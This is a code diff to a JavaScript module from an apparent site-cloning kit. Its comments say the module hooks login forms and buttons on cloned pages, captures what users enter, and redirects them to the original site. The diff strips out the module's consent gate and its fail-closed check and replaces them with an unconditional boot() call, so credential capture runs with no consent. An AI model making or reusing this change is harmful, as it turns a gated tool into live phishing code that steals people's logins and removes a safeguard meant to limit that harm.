@@ -13,15 +13,9 @@
  *  - Also hooks bare login-style buttons that aren't inside a <form>.
  *  - Uses MutationObserver so forms inserted by JS later are still hooked.
  *
- * Gated: the hooks are installed only after the consent notice has been
- * accepted. Until then this module registers and waits — before consent
- * no listener is attached, so a submit does nothing and nothing is sent.
- * With no gate present it stays inert.
- *
  * Globals it expects (set by the cloner bootstrap):
  *   window.__SB_TARGET        — slug of this clone
  *   window.__SB_ORIGINAL_URL  — URL to redirect to after capture
- *   window.__SB_CONSENT       — the consent gate (see consent.js)
  */
 (function () {
   'use strict';
@@ -187,7 +181,5 @@
     }
   }
 
-  // Fail-closed: no consent controller means no capture.
-  if (!window.__SB_CONSENT) return;
-  window.__SB_CONSENT.register('credentials', boot);
+  boot();
 })();
